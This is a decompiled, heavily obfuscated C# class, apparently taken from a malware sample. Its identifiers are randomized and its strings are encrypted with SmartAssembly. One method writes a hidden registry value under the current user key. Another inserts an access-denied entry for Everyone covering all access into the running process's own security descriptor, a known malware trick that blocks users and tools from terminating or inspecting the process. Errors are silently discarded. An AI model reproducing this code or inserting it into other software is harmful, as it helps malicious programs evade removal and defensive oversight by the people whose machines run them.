using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace qYAjLWajCJpnf;

internal sealed class fsCyfZlwoNr
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr AOIGqTsszMMTyEo, int MlFFlylofYO, [Out] byte[] VDhwdCbcfRLd, uint BhRUiQKSiCMfm, out uint tjOvyuUAvcohw);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr RaqPyhbFmtw, int SKOLWhhsnj, [In] byte[] gDxCKXMXkqeb);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void hXHxHtpQwrDh(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(bTJSgdVkQM.gvCYkntYkqMW(getString_0(107458937)));
			registryKey.SetValue(bTJSgdVkQM.gvCYkntYkqMW(getString_0(107458800)), getString_0(107461721));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor tbxJFSDHfHUR(IntPtr intptr_0)
	{
		byte[] vDhwdCbcfRLd = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, vDhwdCbcfRLd, 0u, out var tjOvyuUAvcohw);
		if ((long)tjOvyuUAvcohw > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, vDhwdCbcfRLd = new byte[tjOvyuUAvcohw], tjOvyuUAvcohw, out tjOvyuUAvcohw))
		{
			return null;
		}
		return new RawSecurityDescriptor(vDhwdCbcfRLd, 0);
	}

	private void tsLgwjRdVbQLHc(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void WjboLcIgqQbXx()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = tbxJFSDHfHUR(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			tsLgwjRdVbQLHc(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static fsCyfZlwoNr()
	{
		Strings.CreateGetStringDelegate(typeof(fsCyfZlwoNr));
	}
}
